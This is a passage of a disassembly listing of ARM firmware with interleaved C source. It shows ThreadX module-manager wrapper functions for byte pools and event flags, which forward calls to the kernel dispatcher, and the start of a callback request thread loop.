    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_POOL_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) pool_ptr, (ALIGN_TYPE) allocates, (ALIGN_TYPE) extra_parameters);
 8020792:	4b08      	ldr	r3, [pc, #32]	; (80207b4 <_tx_byte_pool_performance_info_get+0x48>)
 8020794:	f859 3003 	ldr.w	r3, [r9, r3]
 8020798:	681c      	ldr	r4, [r3, #0]
 802079a:	68f9      	ldr	r1, [r7, #12]
 802079c:	68ba      	ldr	r2, [r7, #8]
 802079e:	f107 0314 	add.w	r3, r7, #20
 80207a2:	200d      	movs	r0, #13
 80207a4:	47a0      	blx	r4
 80207a6:	62f8      	str	r0, [r7, #44]	; 0x2c

    /* Return value to the caller.  */
    return(return_value);
 80207a8:	6afb      	ldr	r3, [r7, #44]	; 0x2c
}
 80207aa:	4618      	mov	r0, r3
 80207ac:	3734      	adds	r7, #52	; 0x34
 80207ae:	46bd      	mov	sp, r7
 80207b0:	bd90      	pop	{r4, r7, pc}
 80207b2:	bf00      	nop
 80207b4:	00000004 	.word	0x00000004

080207b8 <_tx_byte_pool_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_byte_pool_performance_system_info_get(ULONG *allocates, ULONG *releases, ULONG *fragments_searched, ULONG *merges, ULONG *splits, ULONG *suspensions, ULONG *timeouts)
{
 80207b8:	b590      	push	{r4, r7, lr}
 80207ba:	b08b      	sub	sp, #44	; 0x2c
 80207bc:	af00      	add	r7, sp, #0
 80207be:	60f8      	str	r0, [r7, #12]
 80207c0:	60b9      	str	r1, [r7, #8]
 80207c2:	607a      	str	r2, [r7, #4]
 80207c4:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[5];

    extra_parameters[0] = (ALIGN_TYPE) fragments_searched;
 80207c6:	687b      	ldr	r3, [r7, #4]
 80207c8:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) merges;
 80207ca:	683b      	ldr	r3, [r7, #0]
 80207cc:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) splits;
 80207ce:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80207d0:	61bb      	str	r3, [r7, #24]
    extra_parameters[3] = (ALIGN_TYPE) suspensions;
 80207d2:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80207d4:	61fb      	str	r3, [r7, #28]
    extra_parameters[4] = (ALIGN_TYPE) timeouts;
 80207d6:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 80207d8:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_POOL_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) allocates, (ALIGN_TYPE) releases, (ALIGN_TYPE) extra_parameters);
 80207da:	4b08      	ldr	r3, [pc, #32]	; (80207fc <_tx_byte_pool_performance_system_info_get+0x44>)
 80207dc:	f859 3003 	ldr.w	r3, [r9, r3]
 80207e0:	681c      	ldr	r4, [r3, #0]
 80207e2:	68f9      	ldr	r1, [r7, #12]
 80207e4:	68ba      	ldr	r2, [r7, #8]
 80207e6:	f107 0310 	add.w	r3, r7, #16
 80207ea:	200e      	movs	r0, #14
 80207ec:	47a0      	blx	r4
 80207ee:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 80207f0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 80207f2:	4618      	mov	r0, r3
 80207f4:	372c      	adds	r7, #44	; 0x2c
 80207f6:	46bd      	mov	sp, r7
 80207f8:	bd90      	pop	{r4, r7, pc}
 80207fa:	bf00      	nop
 80207fc:	00000004 	.word	0x00000004

08020800 <_txe_byte_pool_prioritize>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_pool_prioritize(TX_BYTE_POOL *pool_ptr)
{
 8020800:	b590      	push	{r4, r7, lr}
 8020802:	b085      	sub	sp, #20
 8020804:	af00      	add	r7, sp, #0
 8020806:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_POOL_PRIORITIZE_CALL, (ALIGN_TYPE) pool_ptr, 0, 0);
 8020808:	4b07      	ldr	r3, [pc, #28]	; (8020828 <_txe_byte_pool_prioritize+0x28>)
 802080a:	f859 3003 	ldr.w	r3, [r9, r3]
 802080e:	681c      	ldr	r4, [r3, #0]
 8020810:	6879      	ldr	r1, [r7, #4]
 8020812:	2300      	movs	r3, #0
 8020814:	2200      	movs	r2, #0
 8020816:	200f      	movs	r0, #15
 8020818:	47a0      	blx	r4
 802081a:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 802081c:	68fb      	ldr	r3, [r7, #12]
}
 802081e:	4618      	mov	r0, r3
 8020820:	3714      	adds	r7, #20
 8020822:	46bd      	mov	sp, r7
 8020824:	bd90      	pop	{r4, r7, pc}
 8020826:	bf00      	nop
 8020828:	00000004 	.word	0x00000004

0802082c <_txe_byte_release>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_byte_release(VOID *memory_ptr)
{
 802082c:	b590      	push	{r4, r7, lr}
 802082e:	b085      	sub	sp, #20
 8020830:	af00      	add	r7, sp, #0
 8020832:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_BYTE_RELEASE_CALL, (ALIGN_TYPE) memory_ptr, 0, 0);
 8020834:	4b07      	ldr	r3, [pc, #28]	; (8020854 <_txe_byte_release+0x28>)
 8020836:	f859 3003 	ldr.w	r3, [r9, r3]
 802083a:	681c      	ldr	r4, [r3, #0]
 802083c:	6879      	ldr	r1, [r7, #4]
 802083e:	2300      	movs	r3, #0
 8020840:	2200      	movs	r2, #0
 8020842:	2010      	movs	r0, #16
 8020844:	47a0      	blx	r4
 8020846:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020848:	68fb      	ldr	r3, [r7, #12]
}
 802084a:	4618      	mov	r0, r3
 802084c:	3714      	adds	r7, #20
 802084e:	46bd      	mov	sp, r7
 8020850:	bd90      	pop	{r4, r7, pc}
 8020852:	bf00      	nop
 8020854:	00000004 	.word	0x00000004

08020858 <_txe_event_flags_create>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_event_flags_create(TX_EVENT_FLAGS_GROUP *group_ptr, CHAR *name_ptr, UINT event_control_block_size)
{
 8020858:	b590      	push	{r4, r7, lr}
 802085a:	b087      	sub	sp, #28
 802085c:	af00      	add	r7, sp, #0
 802085e:	60f8      	str	r0, [r7, #12]
 8020860:	60b9      	str	r1, [r7, #8]
 8020862:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_CREATE_CALL, (ALIGN_TYPE) group_ptr, (ALIGN_TYPE) name_ptr, (ALIGN_TYPE) event_control_block_size);
 8020864:	4b07      	ldr	r3, [pc, #28]	; (8020884 <_txe_event_flags_create+0x2c>)
 8020866:	f859 3003 	ldr.w	r3, [r9, r3]
 802086a:	681c      	ldr	r4, [r3, #0]
 802086c:	68f9      	ldr	r1, [r7, #12]
 802086e:	68ba      	ldr	r2, [r7, #8]
 8020870:	687b      	ldr	r3, [r7, #4]
 8020872:	2011      	movs	r0, #17
 8020874:	47a0      	blx	r4
 8020876:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8020878:	697b      	ldr	r3, [r7, #20]
}
 802087a:	4618      	mov	r0, r3
 802087c:	371c      	adds	r7, #28
 802087e:	46bd      	mov	sp, r7
 8020880:	bd90      	pop	{r4, r7, pc}
 8020882:	bf00      	nop
 8020884:	00000004 	.word	0x00000004

08020888 <_txe_event_flags_delete>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_event_flags_delete(TX_EVENT_FLAGS_GROUP *group_ptr)
{
 8020888:	b590      	push	{r4, r7, lr}
 802088a:	b085      	sub	sp, #20
 802088c:	af00      	add	r7, sp, #0
 802088e:	6078      	str	r0, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_DELETE_CALL, (ALIGN_TYPE) group_ptr, 0, 0);
 8020890:	4b07      	ldr	r3, [pc, #28]	; (80208b0 <_txe_event_flags_delete+0x28>)
 8020892:	f859 3003 	ldr.w	r3, [r9, r3]
 8020896:	681c      	ldr	r4, [r3, #0]
 8020898:	6879      	ldr	r1, [r7, #4]
 802089a:	2300      	movs	r3, #0
 802089c:	2200      	movs	r2, #0
 802089e:	2012      	movs	r0, #18
 80208a0:	47a0      	blx	r4
 80208a2:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 80208a4:	68fb      	ldr	r3, [r7, #12]
}
 80208a6:	4618      	mov	r0, r3
 80208a8:	3714      	adds	r7, #20
 80208aa:	46bd      	mov	sp, r7
 80208ac:	bd90      	pop	{r4, r7, pc}
 80208ae:	bf00      	nop
 80208b0:	00000004 	.word	0x00000004

080208b4 <_txe_event_flags_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_event_flags_get(TX_EVENT_FLAGS_GROUP *group_ptr, ULONG requested_flags, UINT get_option, ULONG *actual_flags_ptr, ULONG wait_option)
{
 80208b4:	b590      	push	{r4, r7, lr}
 80208b6:	b089      	sub	sp, #36	; 0x24
 80208b8:	af00      	add	r7, sp, #0
 80208ba:	60f8      	str	r0, [r7, #12]
 80208bc:	60b9      	str	r1, [r7, #8]
 80208be:	607a      	str	r2, [r7, #4]
 80208c0:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) get_option;
 80208c2:	687b      	ldr	r3, [r7, #4]
 80208c4:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) actual_flags_ptr;
 80208c6:	683b      	ldr	r3, [r7, #0]
 80208c8:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) wait_option;
 80208ca:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80208cc:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_GET_CALL, (ALIGN_TYPE) group_ptr, (ALIGN_TYPE) requested_flags, (ALIGN_TYPE) extra_parameters);
 80208ce:	4b08      	ldr	r3, [pc, #32]	; (80208f0 <_txe_event_flags_get+0x3c>)
 80208d0:	f859 3003 	ldr.w	r3, [r9, r3]
 80208d4:	681c      	ldr	r4, [r3, #0]
 80208d6:	68f9      	ldr	r1, [r7, #12]
 80208d8:	f107 0310 	add.w	r3, r7, #16
 80208dc:	68ba      	ldr	r2, [r7, #8]
 80208de:	2013      	movs	r0, #19
 80208e0:	47a0      	blx	r4
 80208e2:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 80208e4:	69fb      	ldr	r3, [r7, #28]
}
 80208e6:	4618      	mov	r0, r3
 80208e8:	3724      	adds	r7, #36	; 0x24
 80208ea:	46bd      	mov	sp, r7
 80208ec:	bd90      	pop	{r4, r7, pc}
 80208ee:	bf00      	nop
 80208f0:	00000004 	.word	0x00000004

080208f4 <_txe_event_flags_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_event_flags_info_get(TX_EVENT_FLAGS_GROUP *group_ptr, CHAR **name, ULONG *current_flags, TX_THREAD **first_suspended, ULONG *suspended_count, TX_EVENT_FLAGS_GROUP **next_group)
{
 80208f4:	b590      	push	{r4, r7, lr}
 80208f6:	b08b      	sub	sp, #44	; 0x2c
 80208f8:	af00      	add	r7, sp, #0
 80208fa:	60f8      	str	r0, [r7, #12]
 80208fc:	60b9      	str	r1, [r7, #8]
 80208fe:	607a      	str	r2, [r7, #4]
 8020900:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[4];

    extra_parameters[0] = (ALIGN_TYPE) current_flags;
 8020902:	687b      	ldr	r3, [r7, #4]
 8020904:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) first_suspended;
 8020906:	683b      	ldr	r3, [r7, #0]
 8020908:	61bb      	str	r3, [r7, #24]
    extra_parameters[2] = (ALIGN_TYPE) suspended_count;
 802090a:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 802090c:	61fb      	str	r3, [r7, #28]
    extra_parameters[3] = (ALIGN_TYPE) next_group;
 802090e:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8020910:	623b      	str	r3, [r7, #32]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_INFO_GET_CALL, (ALIGN_TYPE) group_ptr, (ALIGN_TYPE) name, (ALIGN_TYPE) extra_parameters);
 8020912:	4b08      	ldr	r3, [pc, #32]	; (8020934 <_txe_event_flags_info_get+0x40>)
 8020914:	f859 3003 	ldr.w	r3, [r9, r3]
 8020918:	681c      	ldr	r4, [r3, #0]
 802091a:	68f9      	ldr	r1, [r7, #12]
 802091c:	68ba      	ldr	r2, [r7, #8]
 802091e:	f107 0314 	add.w	r3, r7, #20
 8020922:	2014      	movs	r0, #20
 8020924:	47a0      	blx	r4
 8020926:	6278      	str	r0, [r7, #36]	; 0x24

    /* Return value to the caller.  */
    return(return_value);
 8020928:	6a7b      	ldr	r3, [r7, #36]	; 0x24
}
 802092a:	4618      	mov	r0, r3
 802092c:	372c      	adds	r7, #44	; 0x2c
 802092e:	46bd      	mov	sp, r7
 8020930:	bd90      	pop	{r4, r7, pc}
 8020932:	bf00      	nop
 8020934:	00000004 	.word	0x00000004

08020938 <_tx_event_flags_performance_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_event_flags_performance_info_get(TX_EVENT_FLAGS_GROUP *group_ptr, ULONG *sets, ULONG *gets, ULONG *suspensions, ULONG *timeouts)
{
 8020938:	b590      	push	{r4, r7, lr}
 802093a:	b089      	sub	sp, #36	; 0x24
 802093c:	af00      	add	r7, sp, #0
 802093e:	60f8      	str	r0, [r7, #12]
 8020940:	60b9      	str	r1, [r7, #8]
 8020942:	607a      	str	r2, [r7, #4]
 8020944:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) gets;
 8020946:	687b      	ldr	r3, [r7, #4]
 8020948:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) suspensions;
 802094a:	683b      	ldr	r3, [r7, #0]
 802094c:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) timeouts;
 802094e:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8020950:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_PERFORMANCE_INFO_GET_CALL, (ALIGN_TYPE) group_ptr, (ALIGN_TYPE) sets, (ALIGN_TYPE) extra_parameters);
 8020952:	4b08      	ldr	r3, [pc, #32]	; (8020974 <_tx_event_flags_performance_info_get+0x3c>)
 8020954:	f859 3003 	ldr.w	r3, [r9, r3]
 8020958:	681c      	ldr	r4, [r3, #0]
 802095a:	68f9      	ldr	r1, [r7, #12]
 802095c:	68ba      	ldr	r2, [r7, #8]
 802095e:	f107 0310 	add.w	r3, r7, #16
 8020962:	2015      	movs	r0, #21
 8020964:	47a0      	blx	r4
 8020966:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 8020968:	69fb      	ldr	r3, [r7, #28]
}
 802096a:	4618      	mov	r0, r3
 802096c:	3724      	adds	r7, #36	; 0x24
 802096e:	46bd      	mov	sp, r7
 8020970:	bd90      	pop	{r4, r7, pc}
 8020972:	bf00      	nop
 8020974:	00000004 	.word	0x00000004

08020978 <_tx_event_flags_performance_system_info_get>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_event_flags_performance_system_info_get(ULONG *sets, ULONG *gets, ULONG *suspensions, ULONG *timeouts)
{
 8020978:	b590      	push	{r4, r7, lr}
 802097a:	b089      	sub	sp, #36	; 0x24
 802097c:	af00      	add	r7, sp, #0
 802097e:	60f8      	str	r0, [r7, #12]
 8020980:	60b9      	str	r1, [r7, #8]
 8020982:	607a      	str	r2, [r7, #4]
 8020984:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[2];

    extra_parameters[0] = (ALIGN_TYPE) suspensions;
 8020986:	687b      	ldr	r3, [r7, #4]
 8020988:	617b      	str	r3, [r7, #20]
    extra_parameters[1] = (ALIGN_TYPE) timeouts;
 802098a:	683b      	ldr	r3, [r7, #0]
 802098c:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_PERFORMANCE_SYSTEM_INFO_GET_CALL, (ALIGN_TYPE) sets, (ALIGN_TYPE) gets, (ALIGN_TYPE) extra_parameters);
 802098e:	4b08      	ldr	r3, [pc, #32]	; (80209b0 <_tx_event_flags_performance_system_info_get+0x38>)
 8020990:	f859 3003 	ldr.w	r3, [r9, r3]
 8020994:	681c      	ldr	r4, [r3, #0]
 8020996:	68f9      	ldr	r1, [r7, #12]
 8020998:	68ba      	ldr	r2, [r7, #8]
 802099a:	f107 0314 	add.w	r3, r7, #20
 802099e:	2016      	movs	r0, #22
 80209a0:	47a0      	blx	r4
 80209a2:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 80209a4:	69fb      	ldr	r3, [r7, #28]
}
 80209a6:	4618      	mov	r0, r3
 80209a8:	3724      	adds	r7, #36	; 0x24
 80209aa:	46bd      	mov	sp, r7
 80209ac:	bd90      	pop	{r4, r7, pc}
 80209ae:	bf00      	nop
 80209b0:	00000004 	.word	0x00000004

080209b4 <_txe_event_flags_set>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_event_flags_set(TX_EVENT_FLAGS_GROUP *group_ptr, ULONG flags_to_set, UINT set_option)
{
 80209b4:	b590      	push	{r4, r7, lr}
 80209b6:	b087      	sub	sp, #28
 80209b8:	af00      	add	r7, sp, #0
 80209ba:	60f8      	str	r0, [r7, #12]
 80209bc:	60b9      	str	r1, [r7, #8]
 80209be:	607a      	str	r2, [r7, #4]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_SET_CALL, (ALIGN_TYPE) group_ptr, (ALIGN_TYPE) flags_to_set, (ALIGN_TYPE) set_option);
 80209c0:	4b07      	ldr	r3, [pc, #28]	; (80209e0 <_txe_event_flags_set+0x2c>)
 80209c2:	f859 3003 	ldr.w	r3, [r9, r3]
 80209c6:	681c      	ldr	r4, [r3, #0]
 80209c8:	68f9      	ldr	r1, [r7, #12]
 80209ca:	687b      	ldr	r3, [r7, #4]
 80209cc:	68ba      	ldr	r2, [r7, #8]
 80209ce:	2017      	movs	r0, #23
 80209d0:	47a0      	blx	r4
 80209d2:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 80209d4:	697b      	ldr	r3, [r7, #20]
}
 80209d6:	4618      	mov	r0, r3
 80209d8:	371c      	adds	r7, #28
 80209da:	46bd      	mov	sp, r7
 80209dc:	bd90      	pop	{r4, r7, pc}
 80209de:	bf00      	nop
 80209e0:	00000004 	.word	0x00000004

080209e4 <_txe_event_flags_set_notify>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _txe_event_flags_set_notify(TX_EVENT_FLAGS_GROUP *group_ptr, VOID (*events_set_notify)(TX_EVENT_FLAGS_GROUP *))
{
 80209e4:	b590      	push	{r4, r7, lr}
 80209e6:	b085      	sub	sp, #20
 80209e8:	af00      	add	r7, sp, #0
 80209ea:	6078      	str	r0, [r7, #4]
 80209ec:	6039      	str	r1, [r7, #0]

UINT return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_EVENT_FLAGS_SET_NOTIFY_CALL, (ALIGN_TYPE) group_ptr, (ALIGN_TYPE) events_set_notify, 0);
 80209ee:	4b07      	ldr	r3, [pc, #28]	; (8020a0c <_txe_event_flags_set_notify+0x28>)
 80209f0:	f859 3003 	ldr.w	r3, [r9, r3]
 80209f4:	681c      	ldr	r4, [r3, #0]
 80209f6:	6879      	ldr	r1, [r7, #4]
 80209f8:	683a      	ldr	r2, [r7, #0]
 80209fa:	2300      	movs	r3, #0
 80209fc:	2018      	movs	r0, #24
 80209fe:	47a0      	blx	r4
 8020a00:	60f8      	str	r0, [r7, #12]

    /* Return value to the caller.  */
    return(return_value);
 8020a02:	68fb      	ldr	r3, [r7, #12]
}
 8020a04:	4618      	mov	r0, r3
 8020a06:	3714      	adds	r7, #20
 8020a08:	46bd      	mov	sp, r7
 8020a0a:	bd90      	pop	{r4, r7, pc}
 8020a0c:	00000004 	.word	0x00000004

08020a10 <_txm_module_application_request>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT txm_module_application_request(ULONG request, ALIGN_TYPE param_1, ALIGN_TYPE param_2, ALIGN_TYPE param_3)
{
 8020a10:	b590      	push	{r4, r7, lr}
 8020a12:	b087      	sub	sp, #28
 8020a14:	af00      	add	r7, sp, #0
 8020a16:	60f8      	str	r0, [r7, #12]
 8020a18:	60b9      	str	r1, [r7, #8]
 8020a1a:	607a      	str	r2, [r7, #4]
 8020a1c:	603b      	str	r3, [r7, #0]

UINT   return_value;

    /* Call module manager dispatcher.  */
    return_value = (UINT)(_txm_module_kernel_call_dispatcher)(TXM_APPLICATION_REQUEST_ID_BASE+request, param_1, param_2, param_3);
 8020a1e:	4b08      	ldr	r3, [pc, #32]	; (8020a40 <_txm_module_application_request+0x30>)
 8020a20:	f859 3003 	ldr.w	r3, [r9, r3]
 8020a24:	681c      	ldr	r4, [r3, #0]
 8020a26:	68fb      	ldr	r3, [r7, #12]
 8020a28:	f503 3080 	add.w	r0, r3, #65536	; 0x10000
 8020a2c:	683b      	ldr	r3, [r7, #0]
 8020a2e:	687a      	ldr	r2, [r7, #4]
 8020a30:	68b9      	ldr	r1, [r7, #8]
 8020a32:	47a0      	blx	r4
 8020a34:	6178      	str	r0, [r7, #20]

    /* Return value to the caller.  */
    return(return_value);
 8020a36:	697b      	ldr	r3, [r7, #20]
}
 8020a38:	4618      	mov	r0, r3
 8020a3a:	371c      	adds	r7, #28
 8020a3c:	46bd      	mov	sp, r7
 8020a3e:	bd90      	pop	{r4, r7, pc}
 8020a40:	00000004 	.word	0x00000004

08020a44 <_txm_module_callback_request_thread_entry>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
VOID _txm_module_callback_request_thread_entry(ULONG id)
{
 8020a44:	b580      	push	{r7, lr}
 8020a46:	b098      	sub	sp, #96	; 0x60
 8020a48:	af00      	add	r7, sp, #0
 8020a4a:	6078      	str	r0, [r7, #4]

    /* Disable warning of parameter not used. */
    TX_PARAMETER_NOT_USED(id);

    /* Pickup pointer to the request queue.  */
    request_queue =  _txm_module_entry_info -> txm_module_thread_entry_info_callback_request_queue;
 8020a4c:	4b2d      	ldr	r3, [pc, #180]	; (8020b04 <_txm_module_callback_request_thread_entry+0xc0>)
 8020a4e:	f859 3003 	ldr.w	r3, [r9, r3]
 8020a52:	681b      	ldr	r3, [r3, #0]
 8020a54:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8020a56:	65bb      	str	r3, [r7, #88]	; 0x58
    /* Loop to process callback messages from the module manager.  */
    while(1)
    {

        /* Wait for the callback request for the module.  */
        status =  _txe_queue_receive(request_queue, (VOID *) &callback_message, TX_WAIT_FOREVER);
 8020a58:	f107 030c 	add.w	r3, r7, #12
 8020a5c:	f04f 32ff 	mov.w	r2, #4294967295
 8020a60:	4619      	mov	r1, r3
 8020a62:	6db8      	ldr	r0, [r7, #88]	; 0x58
 8020a64:	f000 fad8 	bl	8021018 <_txe_queue_receive>
 8020a68:	6578      	str	r0, [r7, #84]	; 0x54

        /* Check to see if a request was received.  */
        if (status != TX_SUCCESS)
 8020a6a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8020a6c:	2b00      	cmp	r3, #0
 8020a6e:	d144      	bne.n	8020afa <_txm_module_callback_request_thread_entry+0xb6>
            /* This should not happen - get out of the loop.  */
            break;
        }

        /* Pickup the activation count in the message.  */
        activation_count =  callback_message.txm_module_callback_message_activation_count;
 8020a70:	693b      	ldr	r3, [r7, #16]
 8020a72:	65fb      	str	r3, [r7, #92]	; 0x5c

        /* Loop to call the callback function the correct number of times.  */
        while (activation_count)
 8020a74:	e03d      	b.n	8020af2 <_txm_module_callback_request_thread_entry+0xae>
        {

            /* Decrement the activation count.  */
            activation_count--;
 8020a76:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8020a78:	3b01      	subs	r3, #1
 8020a7a:	65fb      	str	r3, [r7, #92]	; 0x5c

            /* Now dispatch the callback function.  */
            switch (callback_message.txm_module_callback_message_type)
 8020a7c:	68fb      	ldr	r3, [r7, #12]
 8020a7e:	2b04      	cmp	r3, #4
 8020a80:	d836      	bhi.n	8020af0 <_txm_module_callback_request_thread_entry+0xac>
 8020a82:	a202      	add	r2, pc, #8	; (adr r2, 8020a8c <_txm_module_callback_request_thread_entry+0x48>)
 8020a84:	f852 3023 	ldr.w	r3, [r2, r3, lsl #2]
 8020a88:	441a      	add	r2, r3
 8020a8a:	4710      	bx	r2
 8020a8c:	00000015 	.word	0x00000015
 8020a90:	00000023 	.word	0x00000023
 8020a94:	00000033 	.word	0x00000033
 8020a98:	00000043 	.word	0x00000043
 8020a9c:	00000053 	.word	0x00000053
            {

            case TXM_TIMER_CALLBACK:

                /* Setup timer callback pointer.  */
                timer_callback =  (void (*)(ULONG)) callback_message.txm_module_callback_message_application_function;
 8020aa0:	697b      	ldr	r3, [r7, #20]
 8020aa2:	643b      	str	r3, [r7, #64]	; 0x40

                /* Call application's timer callback.  */
                (timer_callback)((ULONG) callback_message.txm_module_callback_message_param_1);
 8020aa4:	69ba      	ldr	r2, [r7, #24]
 8020aa6:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8020aa8:	4610      	mov	r0, r2
 8020aaa:	4798      	blx	r3

                break;
 8020aac:	e021      	b.n	8020af2 <_txm_module_callback_request_thread_entry+0xae>

            case TXM_EVENTS_SET_CALLBACK:

                /* Setup events set callback pointer.  */
                events_set_notify =  (void (*)(TX_EVENT_FLAGS_GROUP *)) callback_message.txm_module_callback_message_application_function;
 8020aae:	697b      	ldr	r3, [r7, #20]
 8020ab0:	647b      	str	r3, [r7, #68]	; 0x44

                /* Call events set notify callback.  */
                (events_set_notify)((TX_EVENT_FLAGS_GROUP *) callback_message.txm_module_callback_message_param_1);
 8020ab2:	69bb      	ldr	r3, [r7, #24]
 8020ab4:	461a      	mov	r2, r3
 8020ab6:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8020ab8:	4610      	mov	r0, r2
 8020aba:	4798      	blx	r3

                break;
 8020abc:	e019      	b.n	8020af2 <_txm_module_callback_request_thread_entry+0xae>

            case TXM_QUEUE_SEND_CALLBACK:

                /* Setup queue send callback pointer.  */
                queue_send_notify =  (void (*)(TX_QUEUE *)) callback_message.txm_module_callback_message_application_function;
 8020abe:	697b      	ldr	r3, [r7, #20]
 8020ac0:	64bb      	str	r3, [r7, #72]	; 0x48

                /* Call queue send notify callback.  */
                (queue_send_notify)((TX_QUEUE *) callback_message.txm_module_callback_message_param_1);
 8020ac2:	69bb      	ldr	r3, [r7, #24]
 8020ac4:	461a      	mov	r2, r3
 8020ac6:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8020ac8:	4610      	mov	r0, r2
 8020aca:	4798      	blx	r3

                break;
 8020acc:	e011      	b.n	8020af2 <_txm_module_callback_request_thread_entry+0xae>

            case TXM_SEMAPHORE_PUT_CALLBACK:

                /* Setup semaphore put callback pointer.  */
                semaphore_put_notify =  (void (*)(TX_SEMAPHORE *)) callback_message.txm_module_callback_message_application_function;
 8020ace:	697b      	ldr	r3, [r7, #20]
 8020ad0:	64fb      	str	r3, [r7, #76]	; 0x4c

                /* Call semaphore put notify callback.  */
                (semaphore_put_notify)((TX_SEMAPHORE *) callback_message.txm_module_callback_message_param_1);
 8020ad2:	69bb      	ldr	r3, [r7, #24]
 8020ad4:	461a      	mov	r2, r3
 8020ad6:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
